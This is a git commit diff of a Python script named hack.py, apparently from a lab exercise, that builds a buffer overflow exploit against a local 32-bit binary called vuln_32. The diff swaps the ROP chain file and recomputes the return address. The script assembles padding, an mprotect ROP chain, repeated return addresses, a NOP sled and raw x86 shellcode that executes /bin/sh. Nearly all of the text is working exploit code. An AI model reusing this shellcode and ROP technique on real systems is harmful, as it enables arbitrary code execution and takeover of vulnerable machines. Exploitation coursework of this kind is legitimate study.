a9da04c81749cf4c7eeb56e8ee272992b885b9f1
Junming Liu <junmingliu.mail@gmail.com>
2020-05-12 23:54:38 -0400

    final

--- hack.py
+++ hack.py
@@ -6,7 +6,7 @@ import sys
 import os
 
 prog = "./vuln_32"
-chain_file="mprotect_chain3"
+chain_file="mprotect_chain4"
 len_to_addr = 40
 nopsled = "\x90" * 25
 padding = "A" * len_to_addr
@@ -18,7 +18,9 @@ buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
 buf += b"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
 buf += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
 buf += b"\x89\xe1\xcd\x80"
-addr = struct.pack("<I", 0xffffd3cc)
+#addr = struct.pack("<I", 0xffffd3cc)
+x = 0xbffff324 + len(padding + ropchain) + 10
+addr = struct.pack("<I", x)
 
 payload = padding + ropchain + addr + addr + addr + nopsled + buf
 #print(len(padding + ropchain))
